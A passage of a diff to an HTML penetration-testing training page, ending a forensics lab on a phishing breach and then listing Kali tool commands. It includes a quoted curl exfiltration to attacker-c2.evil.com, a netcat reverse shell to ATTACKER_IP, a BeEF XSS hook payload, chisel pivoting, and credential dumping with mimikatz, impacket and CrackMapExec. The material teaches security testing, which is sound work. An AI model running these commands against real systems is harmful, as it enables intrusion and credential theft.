+
+# 🚨 Attacker added SSH key for persistent access!
+
+# ==================================================
+# PHASE 8: DATA EXFILTRATION ASSESSMENT
+# ==================================================
+
+# Step 19: Identify all accessed sensitive files
+grep "2024-01-15" timeline_incident.csv | grep ACCESSED | grep -i "document\\|financial\\|secret\\|confidential"
+
+# Files accessed:
+# /home/jsmith/Documents/Q4_Financial_Report.docx
+# /home/jsmith/Documents/Customer_Database.xlsx
+# /home/jsmith/Documents/Employee_SSNs.pdf
+# /home/jsmith/Desktop/Company_Secrets.txt
+
+# Step 20: Check file metadata
+exiftool /mnt/evidence/home/jsmith/Documents/Q4_Financial_Report.docx
+
+# Output:
+# File Name: Q4_Financial_Report.docx
+# File Size: 123 kB
+# File Modified Date: 2024-01-15 14:30:12
+# File Accessed Date: 2024-01-15 14:30:12  # ← Accessed during incident
+# Author: John Smith
+# Company: VictimCompany Inc.
+# Subject: Q4 2023 Financial Results - CONFIDENTIAL
+
+# Step 21: Search for other exfiltration attempts
+grep -r "curl\\|wget\\|scp\\|ftp" /mnt/evidence/home/jsmith/.bash_history
+
+# Found:
+# curl -X POST -F "file=@/home/jsmith/Documents/exfil.zip" http://attacker-c2.evil.com:4444/upload
+
+# Only one exfiltration attempt detected
+
+# ==================================================
+# PHASE 9: INDICATORS OF COMPROMISE (IOCs)
+# ==================================================
+
+# Compile IOCs for threat hunting:
+
+# File Hashes:
+# - invoice.pdf.exe: SHA256: abc123...
+# - .hidden_backdoor: SHA256: def456...
+
+# Network IOCs:
+# - IP: 185.123.45.67 (attacker-c2.evil.com)
+# - Port: 4444/TCP
+# - URL: http://attacker-c2.evil.com:4444/upload
+# - Google Drive link: https://drive.google.com/file/d/abc123/
+
+# Email IOCs:
+# - Sender: finance@fake-vendor.com
+# - Subject: URGENT: Unpaid Invoice #12345
+
+# File IOCs:
+# - /tmp/.hidden_backdoor
+# - /etc/systemd/system/backdoor.service
+# - Cron job: /var/spool/cron/crontabs/jsmith
+# - SSH key in authorized_keys
+
+# Registry changes (if Windows):
+# N/A (Linux system)
+
+# ==================================================
+# PHASE 10: INCIDENT REPORT
+# ==================================================
+
+# EXECUTIVE SUMMARY:
+
+# On January 15, 2024, employee John Smith received a phishing email
+# containing a malicious link disguised as an invoice. Upon clicking,
+# malware was downloaded and executed, establishing command-and-control
+# communication with attacker infrastructure. The attacker enumerated
+# the system, located sensitive documents, and successfully exfiltrated
+# 2.3MB of confidential data including financial reports, customer
+# databases, and employee records. Persistence mechanisms were installed
+# including cron jobs, systemd services, and SSH backdoor. The compromise
+# remained undetected for 3 days until anomalous network activity
+# triggered an alert.
+
+# TIMELINE:
+# Jan 15, 14:21 - Phishing email received
+# Jan 15, 14:23 - User downloads malware (invoice.pdf.exe)
+# Jan 15, 14:24 - User executes malware
+# Jan 15, 14:24 - C2 connection established
+# Jan 15, 14:25 - Attacker reconnaissance (whoami, uname, etc.)
+# Jan 15, 14:30 - Attacker locates sensitive files
+# Jan 15, 14:35 - Data exfiltration (2.3MB zip file uploaded)
+# Jan 15, 14:36 - Persistence mechanisms installed
+# Jan 18, 09:00 - Anomalous traffic detected, incident response initiated
+
+# IMPACT:
+# ⚠️ HIGH - Confidential financial data exfiltrated
+# ⚠️ HIGH - Customer PII (database with SSNs) compromised
+# ⚠️ HIGH - Persistent backdoor with root access installed
+# ⚠️ MEDIUM - Employee productivity loss during investigation
+# ⚠️ LOW - No evidence of lateral movement to other systems
+
+# RECOMMENDATIONS:
+# 1. Immediately block IOCs (IPs, domains, hashes) at firewall/proxy
+# 2. Revoke John Smith's credentials and issue new ones
+# 3. Rebuild compromised system from clean image
+# 4. Conduct threat hunting across entire network using IOCs
+# 5. Implement email security training (anti-phishing)
+# 6. Deploy EDR solution for better detection
+# 7. Implement email gateway with attachment sandboxing
+# 8. Enable MFA for all accounts
+# 9. Restrict executable files in Downloads directory
+# 10. Notify affected customers per breach notification laws
+
+# ==================================================
+# LESSONS LEARNED
+# ==================================================
+
+# ✅ Always verify image integrity (hashes)
+# ✅ Mount images read-only to preserve evidence
+# ✅ Timeline analysis reveals attack progression
+# ✅ Browser/email history shows initial infection vector
+# ✅ Bash history documents attacker actions
+# ✅ Network capture confirms exfiltration
+# ✅ Memory analysis finds active threats
+# ✅ Check ALL persistence locations (cron, systemd, SSH, etc.)
+# ✅ Calculate hashes for all malicious files (IOCs)
+# ✅ Document entire chain of custody
+
+# Forensics workflow summary:
+# 1. Acquire evidence (disk image, memory dump, network capture)
+# 2. Verify integrity (hashes, write-blockers)
+# 3. Create timeline (MACB times, log correlation)
+# 4. Identify initial vector (phishing email, download)
+# 5. Analyze malware (static + dynamic analysis)
+# 6. Review user activity (browser, email, bash history)
+# 7. Examine network traffic (C2 communications, exfiltration)
+# 8. Analyze memory (running processes, network connections)
+# 9. Find persistence mechanisms (cron, services, SSH keys)
+# 10. Assess data exfiltration (what was stolen?)
+# 11. Compile IOCs (hashes, IPs, domains)
+# 12. Write comprehensive report
+
+# Time taken: ~5 hours
+# Difficulty: Intermediate (requires forensics knowledge)</div>
+
+            <div class="metaphor-box">
+                <h4>🎉 You're a Practical Attack Master!</h4>
+                <p>You've completed 5 comprehensive labs covering:<br><br>
+                ✅ <strong>Lab 1 - Web App Pentest:</strong> SQL injection → File upload → Privilege escalation → Root<br>
+                ✅ <strong>Lab 2 - Active Directory:</strong> AS-REP Roasting → BloodHound → Kerberoasting → Domain Admin → DCSync<br>
+                ✅ <strong>Lab 3 - Wireless:</strong> WEP cracking → WPA2 handshake → WPA3 Dragonblood<br>
+                ✅ <strong>Lab 4 - Mobile App:</strong> APK decompilation → Hardcoded secrets → IDOR API → Frida bypass → Certificate pinning<br>
+                ✅ <strong>Lab 5 - Forensics:</strong> Disk analysis → Timeline creation → Memory forensics → Data exfiltration tracking<br><br>
+                <strong>Key skills mastered:</strong><br>
+                • <strong>Enumeration:</strong> Finding attack surface from minimal information<br>
+                • <strong>Tool chaining:</strong> Combining nmap + gobuster + SQLmap + shell<br>
+                • <strong>Lateral movement:</strong> Using BloodHound paths to compromise targets<br>
+                • <strong>Credential attacks:</strong> AS-REP/Kerberoasting, hash cracking, Pass-the-Hash<br>
+                • <strong>Privilege escalation:</strong> SUID binaries, misconfigurations, Windows tokens<br>
+                • <strong>Wireless attacks:</strong> Understanding WEP/WPA/WPA3 differences<br><br>
+                <strong>What's next?</strong><br>
+                • Practice on: <strong>HackTheBox, TryHackMe, PentesterLab</strong><br>
+                • Get certified: <strong>OSCP, PNPT, eCPPT, CRTO</strong><br>
+                • Build labs: <strong>VulnHub VMs, Active Directory home lab</strong><br>
+                • Read writeups: <strong>0xdf.gitlab.io, ippsec.rocks</strong><br>
+                • Join community: <strong>Discord servers, Twitter #infosec, Reddit r/netsec</strong><br><br>
+                You now understand complete attack chains. Every pentest follows similar patterns - adapt these workflows to new targets! 🚀🔥</p>
+            </div>
+        </section>
+
         <!-- SECTION 12: Remaining Kali Tools Dictionary -->
         <section id="remaining-tools" class="section">
             <h2 class="section-title">Comprehensive Kali Linux Tools Dictionary</h2>
@@ -12074,6 +14140,1494 @@ sudo zmap -p 80 -B 10M  # 10 Mbps
 
 # Blocklist:
 sudo zmap -p 80 -b blocklist.txt</div>
+
+            <h3>Additional Essential Tools - Extended Dictionary</h3>
+
+            <div class=\"code\"># ========== BETTERCAP ==========
+# Category: Sniffing & Spoofing
+# Purpose: Swiss Army knife for network attacks (modern replacement for ettercap)
+
+sudo apt install bettercap
+
+# Launch interactive mode:
+sudo bettercap
+
+# Help:
+help
+
+# Basic network recon:
+net.probe on          # Discover hosts
+net.show              # Show discovered hosts
+
+# ARP spoofing (MITM):
+set arp.spoof.targets 192.168.1.10    # Target
+set arp.spoof.fullduplex true
+arp.spoof on                           # Start MITM
+
+# Capture credentials:
+set net.sniff.verbose true
+set net.sniff.local true
+net.sniff on
+
+# HTTP proxy (inject JavaScript):
+set http.proxy.sslstrip true
+set http.proxy.script /path/to/inject.js
+http.proxy on
+
+# DNS spoofing:
+set dns.spoof.domains example.com
+set dns.spoof.address 192.168.1.100
+dns.spoof on
+
+# Caplets (automation scripts):
+# Create file: mitm.cap
+net.probe on
+set arp.spoof.targets 192.168.1.0/24
+arp.spoof on
+net.sniff on
+
+# Run caplet:
+sudo bettercap -caplet mitm.cap
+
+# Web UI (awesome!):
+sudo bettercap -caplet http-ui
+
+# Access: http://127.0.0.1:80
+# Default credentials: user/pass
+
+# Advanced features:
+# - WiFi handshake capture
+# - Bluetooth LE hijacking
+# - GPS tracking
+# - HID attack injection
+# - Packet manipulation
+
+# Example: Steal session cookies
+set http.proxy.sslstrip true
+http.proxy on
+net.sniff on
+# Watch for Set-Cookie headers!
+
+# ========== BINWALK ==========
+# See Section 1 (Digital Forensics) for detailed guide
+
+binwalk firmware.bin                    # Analyze
+binwalk -e firmware.bin                 # Extract
+binwalk -Me firmware.bin                # Extract recursively
+
+# ========== BLOODHOUND ==========
+# Category: Post Exploitation
+# Purpose: Active Directory attack path visualization
+
+# Install:
+sudo apt install bloodhound
+
+# Components:
+# 1. Neo4j database (graph database)
+# 2. BloodHound GUI
+# 3. SharpHound collector (Windows)
+
+# Setup Neo4j:
+sudo neo4j console
+
+# Access: http://localhost:7474
+# Default creds: neo4j/neo4j (change on first login)
+
+# Start BloodHound:
+bloodhound
+
+# Connect to Neo4j:
+# URL: bolt://localhost:7687
+# Username: neo4j
+# Password: (what you set)
+
+# Collect data (on Windows target):
+# Download SharpHound.exe from:
+# https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
+
+# Run on target:
+.\\SharpHound.exe -c All
+
+# Output: [timestamp]_BloodHound.zip
+
+# Import to BloodHound:
+# Drag ZIP file into BloodHound GUI
+
+# Pre-built queries:
+# - Find all Domain Admins
+# - Find shortest path to Domain Admin
+# - Find computers where Domain Users can RDP
+# - Find AS-REP Roastable users
+# - Find Kerberoastable users
+# - Find computers with unconstrained delegation
+
+# Custom Cypher queries:
+# Click "Raw Query" at bottom
+# Example: Find all users with DCSync rights
+MATCH p=(u:User)-[:MemberOf*1..]->(g:Group)-[:GetChanges|GetChangesAll]->(d:Domain)
+RETURN p
+
+# Attack path interpretation:
+# Red icons = high value targets
+# Edges (arrows) = attack relationships:
+#   - AdminTo: Can execute code
+#   - MemberOf: Group membership
+#   - HasSession: Logged in
+#   - CanRDP: Remote Desktop access
+#   - ForceChangePassword: Can reset password
+#   - GenericAll: Full control
+#   - WriteDacl: Can modify permissions
+
+# BloodHound workflow:
+# 1. Run SharpHound on target
+# 2. Import to BloodHound
+# 3. Mark owned users (right-click → Mark as Owned)
+# 4. Query: "Shortest path from Owned Principals to Domain Admin"
+# 5. Follow the path!
+
+# ========== BEEF (Browser Exploitation Framework) ==========
+# Category: Exploitation Tools
+# Purpose: Browser-based exploitation and hooking
+
+sudo apt install beef-xss
+
+# Start:
+sudo beef-xss
+
+# Access UI:
+# URL: http://127.0.0.1:3000/ui/panel
+# Credentials: beef/beef (change in /etc/beef-xss/config.yaml)
+
+# Hook browsers:
+# Inject into vulnerable page:
+<script src=\"http://YOUR_IP:3000/hook.js\"></script>
+
+# Or XSS payload:
+<script src=http://YOUR_IP:3000/hook.js></script>
+
+# When victim visits, browser is "hooked"
+
+# BeEF capabilities:
+# - Browser info (OS, plugins, cookies)
+# - Social engineering (fake notifications)
+# - Network reconnaissance (internal IPs)
+# - Exploit modules:
+#   * Metasploit integration
+#   * Browser autopwn
+#   * Credential harvesting
+#   * Clipboard theft
+#   * Webcam access
+#   * Geolocation
+#   * Port scanning
+#   * Tunnel creation
+
+# Example attack flow:
+# 1. Find XSS vulnerability
+# 2. Inject BeEF hook
+# 3. Wait for victims
+# 4. Select hooked browser
+# 5. Run "Social Engineering" → "Fake Notification" → "Get Clipboard"
+# 6. Run "Network" → "Get Internal IP"
+# 7. Pivot to internal network!
+
+# RESTful API:
+curl -H \"Content-Type: application/json\" -X POST \\
+  -d '{\"username\":\"beef\",\"password\":\"beef\"}' \\
+  http://127.0.0.1:3000/api/admin/login
+
+# ========== CHISEL ==========
+# Category: Post Exploitation
+# Purpose: Fast TCP/UDP tunnel over HTTP (firewall bypass)
+
+# Download:
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gunzip chisel_1.9.1_linux_amd64.gz
+mv chisel_1.9.1_linux_amd64 chisel
+chmod +x chisel
+
+# Server (attacker machine):
+./chisel server --port 8080 --reverse
+
+# Client (target machine):
+./chisel client http://ATTACKER_IP:8080 R:1080:socks
+
+# Now use proxychains to pivot:
+# Edit /etc/proxychains4.conf:
+# socks5 127.0.0.1 1080
+
+# Access internal network:
+proxychains nmap -sT 10.10.10.0/24
+proxychains curl http://internal-server
+
+# Port forwarding:
+./chisel client http://ATTACKER_IP:8080 R:8001:127.0.0.1:80
+
+# Access target's localhost:80 via attacker's 8001
+curl http://127.0.0.1:8001
+
+# ========== COMMIX ==========
+# Category: Web Application Analysis
+# Purpose: Command injection exploitation
+
+sudo apt install commix
+
+# Test parameter:
+commix --url=\"http://target.com/page.php?id=1\"
+
+# Test POST:
+commix --url=\"http://target.com/login.php\" --data=\"user=admin&pass=test\"
+
+# Specify injection point:
+commix --url=\"http://target.com/page.php?id=INJECT_HERE\"
+
+# Techniques:
+# - Classic injection
+# - Eval-based injection
+# - Time-based blind injection
+# - File-based semi-blind injection
+
+# Get shell:
+# Once vulnerability found, commix provides pseudo-shell
+
+# OS commands:
+commix> whoami
+commix> cat /etc/passwd
+commix> nc ATTACKER_IP 4444 -e /bin/bash
+
+# File operations:
+commix> file_read /etc/passwd
+commix> file_write /tmp/shell.php
+
+# ========== CRACKMAPEXEC (CME) ==========
+# Category: Post Exploitation
+# Purpose: Swiss Army knife for pentesting Windows networks
+
+sudo apt install crackmapexec
+
+# SMB enumeration:
+crackmapexec smb 192.168.1.0/24
+
+# Output shows:
+# - Hostname
+# - Domain
+# - OS version
+# - SMB signing
+
+# Credential spraying:
+crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
+
+# Pass-the-Hash:
+crackmapexec smb 192.168.1.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
+# Execute commands:
+crackmapexec smb 192.168.1.10 -u admin -p password -x \"whoami\"
+
+# PowerShell commands:
+crackmapexec smb 192.168.1.10 -u admin -p password -X \"Get-Process\"
+
+# Dump SAM:
+crackmapexec smb 192.168.1.10 -u admin -p password --sam
+
+# Dump LSA secrets:
+crackmapexec smb 192.168.1.10 -u admin -p password --lsa
+
+# Dump NTDS.dit (Domain Controller):
+crackmapexec smb 192.168.1.10 -u admin -p password --ntds
+
+# Enumerate shares:
+crackmapexec smb 192.168.1.10 -u admin -p password --shares
+
+# Enumerate logged-on users:
+crackmapexec smb 192.168.1.10 -u admin -p password --users
+
+# Enumerate sessions:
+crackmapexec smb 192.168.1.10 -u admin -p password --sessions
+
+# Spider shares (find interesting files):
+crackmapexec smb 192.168.1.10 -u admin -p password -M spider_plus
+
+# LDAP enumeration:
+crackmapexec ldap 192.168.1.10 -u user -p password --users
+crackmapexec ldap 192.168.1.10 -u user -p password --groups
+
+# WinRM:
+crackmapexec winrm 192.168.1.10 -u admin -p password -x whoami
+
+# MSSQL:
+crackmapexec mssql 192.168.1.10 -u sa -p password --local-auth
+
+# ========== CRUNCH ==========
+# Category: Password Attacks
+# Purpose: Custom wordlist generator
+
+sudo apt install crunch
+
+# Generate wordlist:
+crunch [min] [max] [charset] -o output.txt
+
+# Examples:
+
+# 4-6 character passwords (lowercase):
+crunch 4 6 abcdefghijklmnopqrstuvwxyz -o wordlist.txt
+
+# Numbers only (0000-9999):
+crunch 4 4 0123456789 -o pins.txt
+
+# Pattern-based:
+crunch 8 8 -t @@@@%%%% -o wordlist.txt
+# @ = lowercase
+# , = uppercase
+# % = numbers
+# ^ = symbols
+
+# Example: Pass1234
+crunch 8 8 -t @@@%%%%% -o wordlist.txt
+
+# With specific charset:
+crunch 6 6 -t @@dog%% -o doglovers.txt
+# Generates: aadog00, aadog01, abdog00, etc.
+
+# Limit output size:
+crunch 4 4 0123456789 -c 1000
+# Splits into files of 1000 lines each
+
+# Pipe to another tool:
+crunch 4 4 0123456789 | aircrack-ng -w - -b 00:11:22:33:44:55 capture.cap
+
+# Company-specific wordlist:
+crunch 8 12 -t Company%%@@ -o company_passwords.txt
+
+# ========== DIRB ==========
+# Category: Web Application Analysis
+# Purpose: Web directory brute-forcing
+
+sudo apt install dirb
+
+# Basic scan:
+dirb http://target.com
+
+# Specific wordlist:
+dirb http://target.com /usr/share/wordlists/dirb/common.txt
+
+# Save output:
+dirb http://target.com -o results.txt
+
+# Ignore HTTP codes:
+dirb http://target.com -N 404
+
+# Specify extensions:
+dirb http://target.com -X .php,.html,.txt
+
+# Custom user-agent:
+dirb http://target.com -a \"Mozilla/5.0...\"
+
+# With authentication:
+dirb http://target.com -u username:password
+
+# Common wordlists:
+# /usr/share/wordlists/dirb/common.txt
+# /usr/share/wordlists/dirb/big.txt
+# /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+
+# ========== DIRBUSTER ==========
+# Category: Web Application Analysis
+# Purpose: GUI directory brute-forcer
+
+sudo apt install dirbuster
+
+# Launch:
+dirbuster
+
+# GUI options:
+# - Target URL
+# - Work method (auto switch to HEAD)
+# - Number of threads
+# - File with list of dirs
+# - File extension (blank, php, asp, jsp)
+
+# Results tab shows:
+# - Found directories
+# - Response codes
+# - Response size
+
+# ========== DMITRY ==========
+# Category: Information Gathering
+# Purpose: Deepmagic Information Gathering Tool
+
+sudo apt install dmitry
+
+# Basic info:
+dmitry -i target.com       # WHOIS
+dmitry -w target.com       # WHOIS
+dmitry -n target.com       # Netcraft info
+dmitry -s target.com       # Subdomain search
+dmitry -e target.com       # Email search
+
+# All modules:
+dmitry -iwnse target.com
+
+# Save output:
+dmitry -iwnse target.com -o results.txt
+
+# ========== DNSENUM ==========
+# Category: Information Gathering
+# Purpose: DNS enumeration
+
+sudo apt install dnsenum
+
+# Basic enumeration:
+dnsenum target.com
+
+# Features:
+# - AXFR (zone transfer)
+# - Standard record enumeration (A, AAAA, NS, MX)
+# - Brute force subdomains
+# - Reverse lookup
+# - Google scraping
+
+# Brute force with wordlist:
+dnsenum --dnsserver 8.8.8.8 --threads 10 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt target.com
+
+# Save output:
+dnsenum target.com -o results.xml
+
+# ========== DNSRECON ==========
+# Category: Information Gathering
+# Purpose: DNS reconnaissance
+
+sudo apt install dnsrecon
+
+# Standard enumeration:
+dnsrecon -d target.com
+
+# Specific record type:
+dnsrecon -d target.com -t std     # Standard
+dnsrecon -d target.com -t axfr    # Zone transfer
+dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  # Brute force
+
+# Reverse lookup:
+dnsrecon -r 192.168.1.0/24
+
+# Cache snooping:
+dnsrecon -t snoop -n SERVER -D domains.txt
+
+# IPv6:
+dnsrecon -d target.com -t std -6
+
+# ========== ENUM4LINUX ==========
+# Category: Information Gathering
+# Purpose: SMB enumeration (Windows/Samba)
+
+sudo apt install enum4linux
+
+# Full enumeration:
+enum4linux 192.168.1.10
+
+# Specific options:
+enum4linux -U 192.168.1.10    # Users
+enum4linux -S 192.168.1.10    # Shares
+enum4linux -G 192.168.1.10    # Groups
+enum4linux -P 192.168.1.10    # Password policy
+
+# All options:
+enum4linux -a 192.168.1.10
+
+# With credentials:
+enum4linux -u admin -p password 192.168.1.10
+
+# Output reveals:
+# - Domain/workgroup name
+# - Users list
+# - Share list
+# - Password policy (min length, complexity)
+# - Group memberships
+
+# ========== ETTERCAP ==========
+# Category: Sniffing & Spoofing
+# Purpose: MITM attacks (older, use bettercap for modern alternative)
+
+sudo apt install ettercap-text-only
+
+# GUI:
+sudo ettercap -G
+
+# Text mode:
+sudo ettercap -T
+
+# Workflow:
+# 1. Select interface
+# 2. Sniff → Unified sniffing
+# 3. Hosts → Scan for hosts
+# 4. Hosts → Hosts list
+# 5. Add Target 1 (gateway)
+# 6. Add Target 2 (victim)
+# 7. MITM → ARP poisoning
+# 8. Start sniffing
+
+# CLI ARP poisoning:
+sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10//
+# Gateway: 192.168.1.1
+# Victim: 192.168.1.10
+
+# Plugins:
+sudo ettercap -T -M arp -P dns_spoof
+
+# DNS spoofing config:
+# Edit /etc/ettercap/etter.dns
+# Add: example.com A 192.168.1.100
+
+# ========== EXIFTOOL ==========
+# Category: Forensics
+# Purpose: Metadata reader/writer
+
+sudo apt install exiftool
+
+# Read metadata:
+exiftool image.jpg
+
+# Shows:
+# - Camera model
+# - GPS coordinates
+# - Date/time
+# - Author
+# - Software used
+
+# Extract GPS:
+exiftool -GPS* image.jpg
+
+# Remove ALL metadata:
+exiftool -all= image.jpg
+
+# Batch process:
+exiftool -all= -r /path/to/photos/
+
+# Write metadata:
+exiftool -Author=\"John Doe\" document.pdf
+
+# ========== FIERCE ==========
+# Category: Information Gathering
+# Purpose: DNS reconnaissance (find non-contiguous IP ranges)
+
+sudo apt install fierce
+
+# Basic scan:
+fierce --domain target.com
+
+# Specify DNS server:
+fierce --domain target.com --dns-servers 8.8.8.8
+
+# Features:
+# - Subdomain enumeration
+# - Zone transfer attempts
+# - IP range detection
+# - Wildcard detection
+
+# ========== FOREMOST ==========
+# See Section 1 (Digital Forensics) for detailed guide
+
+sudo apt install foremost
+
+# Carve files from image:
+foremost -i disk.img -o output/
+
+# Specific file types:
+foremost -t jpg,png,pdf -i disk.img -o output/
+
+# ========== GOBUSTER ==========
+# Category: Web Application Analysis
+# Purpose: Directory/DNS/vhost brute-forcing (fast, written in Go)
+
+sudo apt install gobuster
+
+# Directory brute force:
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# With extensions:
+gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
+
+# Hide specific status codes:
+gobuster dir -u http://target.com -w wordlist.txt -b 404,403
+
+# DNS subdomain brute force:
+gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Vhost discovery:
+gobuster vhost -u http://target.com -w subdomains.txt
+
+# Increase threads (faster):
+gobuster dir -u http://target.com -w wordlist.txt -t 50
+
+# Authentication:
+gobuster dir -u http://target.com -w wordlist.txt -U username -P password
+
+# Cookies:
+gobuster dir -u http://target.com -w wordlist.txt -c \"session=abc123\"
+
+# ========== GOPHISH ==========
+# Category: Social Engineering
+# Purpose: Open-source phishing framework
+
+# Install:
+wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
+unzip gophish-v0.12.1-linux-64bit.zip
+chmod +x gophish
+
+# Run:
+./gophish
+
+# Access: https://127.0.0.1:3333
+# Default: admin / gophish (change immediately)
+
+# Components:
+# 1. Sending Profiles (SMTP server config)
+# 2. Email Templates (phishing email)
+# 3. Landing Pages (fake login page)
+# 4. User Groups (target list)
+# 5. Campaigns (puts it all together)
+
+# Workflow:
+# 1. Import users (CSV: First,Last,Email,Position)
+# 2. Create email template
+# 3. Clone landing page (or create custom)
+# 4. Configure SMTP
+# 5. Launch campaign
+# 6. Monitor results (emails sent, opened, clicked, data submitted)
+
+# API:
+curl -H \"Authorization: Bearer API_KEY\" https://localhost:3333/api/campaigns
+
+# ========== HASHCAT ==========
+# See Bonus Part 1 for detailed guide
+
+sudo apt install hashcat
+
+# Crack hash:
+hashcat -m 1000 -a 0 hash.txt rockyou.txt
+# -m 1000 = NTLM
+# -a 0 = Dictionary attack
+
+# Common hash types:
+# 0 = MD5
+# 100 = SHA1
+# 1000 = NTLM
+# 1800 = SHA512 (Unix)
+# 3200 = bcrypt
+# 13100 = Kerberos TGS-REP
+# 18200 = Kerberos AS-REP
+
+# ========== HEXEDIT ==========
+# Category: Utility
+# Purpose: Hex editor (terminal-based)
+
+sudo apt install hexedit
+
+# Edit file:
+hexedit file.bin
+
+# Controls:
+# Arrow keys: Navigate
+# Tab: Switch between hex/ASCII
+# Ctrl+S: Save
+# Ctrl+X: Exit
+
+# Use case: Binary patching, file analysis
+
+# ========== HPING3 ==========
+# Category: Sniffing & Spoofing
+# Purpose: TCP/IP packet crafting
+
+sudo apt install hping3
+
+# Ping:
+hping3 -1 target.com     # ICMP ping
+hping3 -S -p 80 target.com  # SYN to port 80
+
+# Port scan:
+hping3 -S target.com -p ++1    # Scan ports sequentially
+
+# Flood (DoS - ILLEGAL without permission!):
+hping3 -S --flood -p 80 target.com
+
+# Traceroute:
+hping3 -T target.com
+
+# File transfer:
+# Sender:
+hping3 -9 signature -I eth0
+
+# Receiver:
+hping3 -9 signature target.com
+
+# ========== HYDRA ==========
+# See Bonus Part 1 for detailed guide
+
+sudo apt install hydra
+
+# SSH brute force:
+hydra -l admin -P passwords.txt ssh://192.168.1.10
+
+# HTTP POST:
+hydra -l admin -P passwords.txt target.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\"
+
+# FTP:
+hydra -L users.txt -P passwords.txt ftp://192.168.1.10
+
+# RDP:
+hydra -l administrator -P passwords.txt rdp://192.168.1.10
+
+# ========== IMPACKET ==========
+# Category: Post Exploitation / Exploitation
+# Purpose: Python library for network protocols (many tools!)
+
+sudo apt install impacket-scripts
+
+# Key tools:
+
+# psexec.py (like PsExec):
+impacket-psexec domain/user:password@192.168.1.10
+
+# secretsdump.py (dump credentials):
+impacket-secretsdump domain/user:password@192.168.1.10
+
+# GetNPUsers.py (AS-REP Roasting):
+impacket-GetNPUsers domain/ -dc-ip 192.168.1.10 -usersfile users.txt -format hashcat
+
+# GetUserSPNs.py (Kerberoasting):
+impacket-GetUserSPNs domain/user:password -dc-ip 192.168.1.10 -request
+
+# smbexec.py:
+impacket-smbexec domain/user:password@192.168.1.10
+
+# wmiexec.py:
+impacket-wmiexec domain/user:password@192.168.1.10
+
+# atexec.py (scheduled task execution):
+impacket-atexec domain/user:password@192.168.1.10 \"whoami\"
+
+# ntlmrelayx.py (NTLM relay attack):
+impacket-ntlmrelayx -tf targets.txt -smb2support
+
+# ========== JOHN THE RIPPER ==========
+# See Bonus Part 1 for detailed guide
+
+sudo apt install john
+
+# Crack password:
+john --wordlist=rockyou.txt hash.txt
+
+# Crack with rules:
+john --wordlist=rockyou.txt --rules hash.txt
+
+# Show cracked:
+john --show hash.txt
+
+# Hash extraction tools:
+# /usr/share/john/ssh2john.py id_rsa > hash.txt
+# /usr/share/john/zip2john.py file.zip > hash.txt
+# /usr/share/john/rar2john.py file.rar > hash.txt
+
+# ========== KATANA ==========
+# Category: Web Application Analysis
+# Purpose: Next-gen crawling framework
+
+go install github.com/projectdiscovery/katana/cmd/katana@latest
+
+# Crawl website:
+katana -u http://target.com
+
+# Specific depth:
+katana -u http://target.com -d 5
+
+# Extract endpoints:
+katana -u http://target.com -jc  # JavaScript files
+
+# Output:
+katana -u http://target.com -o urls.txt
+
+# ========== LEGION ==========
+# Category: Information Gathering
+# Purpose: Automated penetration testing framework (GUI)
+
+sudo apt install legion
+
+# Launch:
+sudo legion
+
+# Features:
+# - Auto nmap scanning
+# - Service detection
+# - Auto brute-forcing
+# - Scheduled tasks
+# - Note-taking
+
+# Workflow:
+# 1. Add target IP
+# 2. Auto-scans with nmap
+# 3. Right-click services for attacks
+# 4. Auto bruteforce (hydra integration)
+
+# ========== MASSCAN ==========
+# Category: Information Gathering
+# Purpose: Fastest port scanner (scans Internet in 6 minutes!)
+
+sudo apt install masscan
+
+# Scan specific ports:
+sudo masscan -p80,443 192.168.1.0/24
+
+# Scan all ports:
+sudo masscan -p0-65535 192.168.1.10
+
+# Rate limiting:
+sudo masscan -p80 10.0.0.0/8 --rate 10000
+
+# Banners:
+sudo masscan -p80,443 192.168.1.0/24 --banners
+
+# Output:
+sudo masscan -p80 192.168.1.0/24 -oL output.txt
+
+# Exclude IPs:
+sudo masscan -p80 0.0.0.0/0 --excludefile exclude.txt
+
+# ========== MEDUSA ==========
+# Category: Password Attacks
+# Purpose: Parallel brute-forcing (faster than hydra for some protocols)
+
+sudo apt install medusa
+
+# SSH:
+medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh
+
+# HTTP:
+medusa -h 192.168.1.10 -u admin -P passwords.txt -M http -m DIR:/admin
+
+# FTP:
+medusa -h 192.168.1.10 -u admin -P passwords.txt -M ftp
+
+# Multiple hosts:
+medusa -H hosts.txt -u admin -P passwords.txt -M ssh
+
+# Parallel connections:
+medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -t 16
+
+# ========== MIMIKATZ ==========
+# Category: Post Exploitation
+# Purpose: Windows credential extraction (run on Windows target)
+
+# Download:
+# https://github.com/gentilkiwi/mimikatz/releases
+
+# Run (requires admin):
+mimikatz.exe
+
+# Extract passwords from memory:
+mimikatz# privilege::debug
+mimikatz# sekurlsa::logonpasswords
+
+# Extract Kerberos tickets:
+mimikatz# sekurlsa::tickets
+
+# Pass-the-Hash:
+mimikatz# sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:HASH /run:cmd
+
+# DCSync (dump all domain hashes):
+mimikatz# lsadump::dcsync /domain:corp.com /all /csv
+
+# Golden Ticket:
+mimikatz# kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:HASH /id:500
+
+# ========== NBTSCAN ==========
+# Category: Information Gathering
+# Purpose: NetBIOS scanner
+
+sudo apt install nbtscan
+
+# Scan subnet:
+nbtscan 192.168.1.0/24
+
+# Verbose:
+nbtscan -v 192.168.1.0/24
+
+# Output:
+# IP address   NetBIOS Name   Server   User   MAC address
+
+# ========== NETCAT ==========
+# Category: Utility
